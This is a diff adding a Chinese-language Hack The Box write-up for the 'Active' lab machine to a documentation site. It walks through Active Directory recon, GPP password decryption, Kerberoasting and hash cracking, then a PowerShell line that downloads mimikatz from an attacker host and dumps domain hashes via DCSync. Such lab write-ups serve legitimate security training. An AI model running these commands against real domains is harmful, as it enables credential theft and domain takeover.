@@ -755,6 +755,17 @@
         
       
       
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Active
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
       <a href="./" class="md-nav__link md-nav__link--active">
         
   
@@ -764,6 +775,61 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#recon-enum" class="md-nav__link">
+    <span class="md-ellipsis">
+      Recon &amp; Enum
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shell-as-user-svc_tgs" class="md-nav__link">
+    <span class="md-ellipsis">
+      Shell as User - SVC_TGS
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shell-as-root" class="md-nav__link">
+    <span class="md-ellipsis">
+      Shell as Root
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dump-hash" class="md-nav__link">
+    <span class="md-ellipsis">
+      Dump Hash
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
       
     </li>
   
@@ -782,6 +848,27 @@
   
   <span class="md-ellipsis">
     Bizness
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Blackfield/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Blackfield
   </span>
   
 
@@ -882,11 +969,53 @@
   
   
     <li class="md-nav__item">
+      <a href="../Monitored/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Monitored
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
       <a href="../Netmon/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
     Netmon
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Resolute/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Resolute
   </span>
   
 
@@ -1229,6 +1358,131 @@
 
 
 <h1 id="active">Active</h1>
+<p><img alt="" src="../assets/Active.png" /></p>
+<h2 id="recon-enum">Recon &amp; Enum</h2>
+<blockquote>
+<p>export IP=10.10.10.100
+- <code>nmap -sC -A -p- --min-rate 1000 -T4 $IP</code>
+<div class="language-shell highlight"><pre><span></span><code>PORT<span class="w">      </span>STATE<span class="w"> </span>SERVICE<span class="w">       </span>VERSION
+<span class="m">53</span>/tcp<span class="w">    </span>open<span class="w">  </span>domain<span class="w">        </span>Microsoft<span class="w"> </span>DNS<span class="w"> </span><span class="m">6</span>.1.7601<span class="w"> </span><span class="o">(</span>1DB15D39<span class="o">)</span><span class="w"> </span><span class="o">(</span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2008</span><span class="w"> </span>R2<span class="w"> </span>SP1<span class="o">)</span>
+<span class="p">|</span><span class="w"> </span>dns-nsid:<span class="w"> </span>
+<span class="p">|</span>_<span class="w">  </span>bind.version:<span class="w"> </span>Microsoft<span class="w"> </span>DNS<span class="w"> </span><span class="m">6</span>.1.7601<span class="w"> </span><span class="o">(</span>1DB15D39<span class="o">)</span>
+<span class="m">88</span>/tcp<span class="w">    </span>open<span class="w">  </span>kerberos-sec<span class="w">  </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Kerberos<span class="w"> </span><span class="o">(</span>server<span class="w"> </span>time:<span class="w"> </span><span class="m">2024</span>-01-11<span class="w"> </span><span class="m">13</span>:22:10Z<span class="o">)</span>
+<span class="m">135</span>/tcp<span class="w">   </span>open<span class="w">  </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<span class="m">139</span>/tcp<span class="w">   </span>open<span class="w">  </span>netbios-ssn<span class="w">   </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>netbios-ssn
+<span class="m">389</span>/tcp<span class="w">   </span>open<span class="w">  </span>ldap<span class="w">          </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>active.htb,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
+<span class="m">445</span>/tcp<span class="w">   </span>open<span class="w">  </span>microsoft-ds?
+<span class="m">464</span>/tcp<span class="w">   </span>open<span class="w">  </span>kpasswd5?
+<span class="m">593</span>/tcp<span class="w">   </span>open<span class="w">  </span>ncacn_http<span class="w">    </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC<span class="w"> </span>over<span class="w"> </span>HTTP<span class="w"> </span><span class="m">1</span>.0
+<span class="m">636</span>/tcp<span class="w">   </span>open<span class="w">  </span>tcpwrapped
+<span class="m">3268</span>/tcp<span class="w">  </span>open<span class="w">  </span>ldap<span class="w">          </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>active.htb,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
+<span class="m">3269</span>/tcp<span class="w">  </span>open<span class="w">  </span>tcpwrapped
+<span class="m">5722</span>/tcp<span class="w">  </span>open<span class="w">  </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<span class="m">9389</span>/tcp<span class="w">  </span>open<span class="w">  </span>mc-nmf<span class="w">        </span>.NET<span class="w"> </span>Message<span class="w"> </span>Framing
+<span class="m">47001</span>/tcp<span class="w"> </span>open<span class="w">  </span>http<span class="w">          </span>Microsoft<span class="w"> </span>HTTPAPI<span class="w"> </span>httpd<span class="w"> </span><span class="m">2</span>.0<span class="w"> </span><span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+<span class="p">|</span>_http-title:<span class="w"> </span>Not<span class="w"> </span>Found
+<span class="p">|</span>_http-server-header:<span class="w"> </span>Microsoft-HTTPAPI/2.0
+<span class="m">49152</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<span class="m">49153</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<span class="m">49154</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<span class="m">49155</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<span class="m">49157</span>/tcp<span class="w"> </span>open<span class="w">  </span>ncacn_http<span class="w">    </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC<span class="w"> </span>over<span class="w"> </span>HTTP<span class="w"> </span><span class="m">1</span>.0
+<span class="m">49158</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<span class="m">49165</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<span class="m">49170</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<span class="m">49171</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+Warning:<span class="w"> </span>OSScan<span class="w"> </span>results<span class="w"> </span>may<span class="w"> </span>be<span class="w"> </span>unreliable<span class="w"> </span>because<span class="w"> </span>we<span class="w"> </span>could<span class="w"> </span>not<span class="w"> </span>find<span class="w"> </span>at<span class="w"> </span>least<span class="w"> </span><span class="m">1</span><span class="w"> </span>open<span class="w"> </span>and<span class="w"> </span><span class="m">1</span><span class="w"> </span>closed<span class="w"> </span>port
+Aggressive<span class="w"> </span>OS<span class="w"> </span>guesses:<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span><span class="m">7</span><span class="w"> </span>SP1<span class="w"> </span><span class="o">(</span><span class="m">96</span>%<span class="o">)</span>,<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span><span class="m">7</span><span class="w"> </span><span class="o">(</span><span class="m">95</span>%<span class="o">)</span>,<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span><span class="m">7</span><span class="w"> </span>or<span class="w"> </span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2008</span><span class="w"> </span>R2<span class="w"> </span><span class="o">(</span><span class="m">94</span>%<span class="o">)</span>,<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2008</span><span class="w"> </span>R2<span class="w"> </span><span class="o">(</span><span class="m">94</span>%<span class="o">)</span>,<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span><span class="o">(</span><span class="m">93</span>%<span class="o">)</span>,<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span><span class="m">1507</span><span class="w"> </span><span class="o">(</span><span class="m">93</span>%<span class="o">)</span>,<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span><span class="m">1507</span><span class="w"> </span>-<span class="w"> </span><span class="m">1607</span><span class="w"> </span><span class="o">(</span><span class="m">93</span>%<span class="o">)</span>,<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span><span class="m">1511</span><span class="w"> </span><span class="o">(</span><span class="m">93</span>%<span class="o">)</span>,<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Home<span class="w"> </span>Server<span class="w"> </span><span class="m">2011</span><span class="w"> </span><span class="o">(</span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2008</span><span class="w"> </span>R2<span class="o">)</span><span class="w"> </span><span class="o">(</span><span class="m">93</span>%<span class="o">)</span>,<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2008</span><span class="w"> </span>SP1<span class="w"> </span><span class="o">(</span><span class="m">93</span>%<span class="o">)</span>
+No<span class="w"> </span>exact<span class="w"> </span>OS<span class="w"> </span>matches<span class="w"> </span><span class="k">for</span><span class="w"> </span>host<span class="w"> </span><span class="o">(</span><span class="nb">test</span><span class="w"> </span>conditions<span class="w"> </span>non-ideal<span class="o">)</span>.
+Network<span class="w"> </span>Distance:<span class="w"> </span><span class="m">2</span><span class="w"> </span>hops
+Service<span class="w"> </span>Info:<span class="w"> </span>Host:<span class="w"> </span>DC<span class="p">;</span><span class="w"> </span>OS:<span class="w"> </span>Windows<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:microsoft:windows_server_2008:r2:sp1,<span class="w"> </span>cpe:/o:microsoft:windows
+
+Host<span class="w"> </span>script<span class="w"> </span>results:
+<span class="p">|</span><span class="w"> </span>smb2-time:<span class="w"> </span>
+<span class="p">|</span><span class="w">   </span>date:<span class="w"> </span><span class="m">2024</span>-01-11T13:23:21
+<span class="p">|</span>_<span class="w">  </span>start_date:<span class="w"> </span><span class="m">2024</span>-01-11T00:12:28
+<span class="p">|</span>_clock-skew:<span class="w"> </span>-23s
+<span class="p">|</span><span class="w"> </span>smb2-security-mode:<span class="w"> </span>
+<span class="p">|</span><span class="w">   </span><span class="m">2</span>:1:0:<span class="w"> </span>
+<span class="p">|</span>_<span class="w">    </span>Message<span class="w"> </span>signing<span class="w"> </span>enabled<span class="w"> </span>and<span class="w"> </span>required
+</code></pre></div>
+- <code>ldapsearch</code>
+<div class="language-shell highlight"><pre><span></span><code>ldapsearch<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;ldap://</span><span class="nv">$IP</span><span class="s2">&quot;</span><span class="w"> </span>-x<span class="w"> </span>-s<span class="w"> </span>base<span class="w"> </span>namingcontexts
+---
+dn:
+namingContexts:<span class="w"> </span><span class="nv">DC</span><span class="o">=</span>active,DC<span class="o">=</span>htb
+namingContexts:<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>Configuration,DC<span class="o">=</span>active,DC<span class="o">=</span>htb
+namingContexts:<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>active,DC<span class="o">=</span>htb
+namingContexts:<span class="w"> </span><span class="nv">DC</span><span class="o">=</span>DomainDnsZones,DC<span class="o">=</span>active,DC<span class="o">=</span>htb
+namingContexts:<span class="w"> </span><span class="nv">DC</span><span class="o">=</span>ForestDnsZones,DC<span class="o">=</span>active,DC<span class="o">=</span>htb
+
+ldapsearch<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;ldap://</span><span class="nv">$IP</span><span class="s2">&quot;</span><span class="w"> </span>-x<span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;DC=active,DC=htb&quot;</span>
+---
+Null
+</code></pre></div>
+- enum4linux
+<img alt="" src="../assets/Pasted%20image%2020240111220611.png" />
+发现部分 SMB Shares
+- <code>smbclient //10.10.10.100/Replication</code>
+<img alt="" src="../assets/Pasted%20image%2020240111220725.png" />
+<img alt="" src="../assets/Pasted%20image%2020240111220839.png" />
+发现了4个文件，并在其中发现了账户 <code>active.htb\SVC_TGS</code> 和被加密的密码： <code>edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ</code></p>
+</blockquote>
+<h2 id="shell-as-user-svc_tgs">Shell as User - SVC_TGS</h2>
+<p><img alt="" src="../assets/Pasted%20image%2020240111222504.png" />
+是 AES-256 加密，可以使用 <code>gpp-decrypt</code> 解密
+<img alt="" src="../assets/Pasted%20image%2020240111223117.png" />
+<code>active.htb/SVC_TGS:GPPstillStandingStrong2k18</code>
+- 继续枚举 Samba Shares
+<div class="language-shell highlight"><pre><span></span><code>crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="nv">$IP</span><span class="w"> </span>-u<span class="w"> </span>SVC_TGS<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;GPPstillStandingStrong2k18&#39;</span><span class="w"> </span>--shares
+---
+SMB<span class="w">         </span><span class="m">10</span>.10.10.100<span class="w">    </span><span class="m">445</span><span class="w">    </span>DC<span class="w">               </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">6</span>.1<span class="w"> </span>Build<span class="w"> </span><span class="m">7601</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:DC<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:active.htb<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB<span class="w">         </span><span class="m">10</span>.10.10.100<span class="w">    </span><span class="m">445</span><span class="w">    </span>DC<span class="w">               </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>active.htb<span class="se">\S</span>VC_TGS:GPPstillStandingStrong2k18<span class="w"> </span>
+SMB<span class="w">         </span><span class="m">10</span>.10.10.100<span class="w">    </span><span class="m">445</span><span class="w">    </span>DC<span class="w">               </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Enumerated<span class="w"> </span>shares
+SMB<span class="w">         </span><span class="m">10</span>.10.10.100<span class="w">    </span><span class="m">445</span><span class="w">    </span>DC<span class="w">               </span>Share<span class="w">           </span>Permissions<span class="w">     </span>Remark
+SMB<span class="w">         </span><span class="m">10</span>.10.10.100<span class="w">    </span><span class="m">445</span><span class="w">    </span>DC<span class="w">               </span>-----<span class="w">           </span>-----------<span class="w">     </span>------
+SMB<span class="w">         </span><span class="m">10</span>.10.10.100<span class="w">    </span><span class="m">445</span><span class="w">    </span>DC<span class="w">               </span>ADMIN$<span class="w">                          </span>Remote<span class="w"> </span>Admin
+SMB<span class="w">         </span><span class="m">10</span>.10.10.100<span class="w">    </span><span class="m">445</span><span class="w">    </span>DC<span class="w">               </span>C$<span class="w">                              </span>Default<span class="w"> </span>share
+SMB<span class="w">         </span><span class="m">10</span>.10.10.100<span class="w">    </span><span class="m">445</span><span class="w">    </span>DC<span class="w">               </span>IPC$<span class="w">                            </span>Remote<span class="w"> </span>IPC
+SMB<span class="w">         </span><span class="m">10</span>.10.10.100<span class="w">    </span><span class="m">445</span><span class="w">    </span>DC<span class="w">               </span>NETLOGON<span class="w">        </span>READ<span class="w">            </span>Logon<span class="w"> </span>server<span class="w"> </span>share<span class="w"> </span>
+SMB<span class="w">         </span><span class="m">10</span>.10.10.100<span class="w">    </span><span class="m">445</span><span class="w">    </span>DC<span class="w">               </span>Replication<span class="w">     </span>READ<span class="w">            </span>
+SMB<span class="w">         </span><span class="m">10</span>.10.10.100<span class="w">    </span><span class="m">445</span><span class="w">    </span>DC<span class="w">               </span>SYSVOL<span class="w">          </span>READ<span class="w">            </span>Logon<span class="w"> </span>server<span class="w"> </span>share<span class="w"> </span>
+SMB<span class="w">         </span><span class="m">10</span>.10.10.100<span class="w">    </span><span class="m">445</span><span class="w">    </span>DC<span class="w">               </span>Users<span class="w">           </span>READ
+</code></pre></div>
+- 找到 Users 目录
+<img alt="" src="../assets/Pasted%20image%2020240111225225.png" />
+- 遛狗
+<img alt="" src="../assets/Pasted%20image%2020240112083039.png" />
+但是没 shell，操作不了</p>
+<h2 id="shell-as-root">Shell as Root</h2>
+<ul>
+<li>查看设置了 SPN 的账户，发现 administrator
+<div class="language-shell highlight"><pre><span></span><code>impacket-GetUserSPNs<span class="w"> </span>active.htb/SVC_TGS:GPPstillStandingStrong2k18<span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$IP</span><span class="w"> </span>-dc-host<span class="w"> </span>DC.active.htb
+</code></pre></div>
+<img alt="" src="../assets/Pasted%20image%2020240111230435.png" /></li>
+<li>尝试 Kerberoasting 获取服务 Hash
+<div class="language-shell highlight"><pre><span></span><code>impacket-GetUserSPNs<span class="w"> </span>active.htb/SVC_TGS:GPPstillStandingStrong2k18<span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$IP</span><span class="w"> </span>-dc-host<span class="w"> </span>DC.active.htb<span class="w"> </span>-request
+</code></pre></div>
+<img alt="" src="../assets/Pasted%20image%2020240112085559.png" /></li>
+<li>爆破 Hash
+<div class="language-shell highlight"><pre><span></span><code>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>hash.list<span class="w"> </span>/usr/share/wordlists/rockyou.txt
+---
+<span class="nv">$krb5tgs$23$*</span>Administrator<span class="nv">$ACTIVE</span>.HTB<span class="nv">$active</span>.htb/Administrator*<span class="nv">$ab13391da2a1d4d8992ba3d12d3927ef$26</span>a5ea21be878ceff5464e9c76c032fac700d4ec0b10566a55fdefbf7c629fa1c63e2b6c10a34e6517e704b3cd9909493a6944f60416772d662d7284c2d5733cc3fa0fda0819dcda9f581e7a3d5fad7227966886ee1349e01c297c1e3656e02a1d790ec71161c80d5d4143d84975fa67512ab2f17acd0d4a2104744d4c576d7e207460ddd6a9f754123176ea901f33c0b3f58e64658c81b81df8f996f44b764e7970ae9d265032925db343bfac983471b6b8690319e8d8c8cfa2709ff2e19b458a20d5524ca25dbefd49ebf24625ffcc8707e2d0578e418fba6ab474c428f26c853126f8901a733540577a7f739f425ee1683b51b5b32de021b2facbc1f04292d8a5bb35c03c7541f6d95cc939ddc198612d88ef9df6d20e20651d2cc48b10edfc3ec470ddd7488b42ffeb92b0bc733c5120273b0a600fee4cda1777042d88b5376ea32176dfbb405165824fdcb5715db92521599469a137c41fffe5e079985a7646ea6859b4c5a656bc8ef4c6aea250f8eafcc080e4a039146e474dab7f18221d518ae85381596aefc231b72df63e92935c483addbc4b2e6cb49be7162526cc30cc78bbe6e638115188ccee8a20d3d10fe3e5604567d6908d92ab09054ab8c46172438dc964c7075749bf4a94122e7dc6bd0cd2dd737c194fbc671d087a36fcd84d1f500377970246036e8deab3712977d8615deb600f38a27253a908d9544b9dff17a7dbdd36e5c70c6b2a99814f822c6b74d1a3646f88ce93a391f3e384ac81fe142dce20bf2273e457d74c7184ff1e0799473139ea7e1dd18c293819b922a66b8d5b0872f352cba575cee04fda5ee9f834c470051aa6e4d083411a092923d23334f13550437cbd92fd6da6d5cd322fa321c379e89535685110027522852e7e1ee79350ced72ec807cab49afd0c8b8c9c607f665c43d318f4a22135f20a33da060aa5ee8914d5e59c143bfe64e3f95c2497ea613e7d7eb42650709bc77feb4e66fc26cde267c5332a1d015ec0095d3eacf1ce016778db78df448e22a113bbe11f151cce087c2dff879de0a6b305caf0bcb3f36b63e97a7b4079972395c472c6ae3bd4b72b6f6efae046a69dcf6bc5cd370d366c4f89ee0dc41d0aa95231a994764e2d45e61a5720d20cec8b5fe12548527143b187b4eda59cc94ec2729d29ea0424dce5a2c8f459fe23f3957a6bd4f08883932867fdf8f29b2b805f9a769f479f2a1f7d2029aeea8fa44c891bf6089947580f2a707747bf7f:Ticketmaster1968
+</code></pre></div></li>
+<li><code>Administrator:Ticketmaster1968</code>
+<img alt="" src="../assets/Pasted%20image%2020240112090148.png" /></li>
+</ul>
+<h2 id="dump-hash">Dump Hash</h2>
+<div class="language-shell highlight"><pre><span></span><code>powershell<span class="w"> </span><span class="o">(</span>new-object<span class="w"> </span>System.Net.WebClient<span class="o">)</span>.DownloadFile<span class="o">(</span><span class="s1">&#39;http://10.10.16.18/mimikatz.exe&#39;</span>,<span class="s1">&#39;C:\Windows\Temp\mimikatz.exe&#39;</span><span class="o">)</span>
+C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\m</span>imikatz.exe<span class="w"> </span><span class="s2">&quot;privilege::debug&quot;</span><span class="w"> </span><span class="s2">&quot;token::elevate&quot;</span><span class="w"> </span><span class="s2">&quot;lsadump::dcsync /domain:active.htb /all /csv&quot;</span><span class="w"> </span><span class="nb">exit</span>
+---<span class="w"> </span>Local
+Administrator:5c15eb37006fb74c21a5d1e2144b726e
+---<span class="w"> </span>Domain
+<span class="m">502</span><span class="w">     </span>krbtgt<span class="w">          </span>b889e0d47d6fe22c8f0463a717f460dc<span class="w">        </span><span class="m">514</span>
+<span class="m">500</span><span class="w">     </span>Administrator<span class="w">   </span>5ffb4aaaf9b63dc519eca04aec0e8bed<span class="w">        </span><span class="m">66048</span>
+<span class="m">1000</span><span class="w">    </span>DC$<span class="w">             </span>ad785e2162b240a84dc409c0a4555b0a<span class="w">        </span><span class="m">532480</span>
+<span class="m">1103</span><span class="w">    </span>SVC_TGS<span class="w">         </span>f54f3a1d3c38140684ff4dad029f25b5<span class="w">        </span><span class="m">66048</span>
+</code></pre></div>
 
 
 
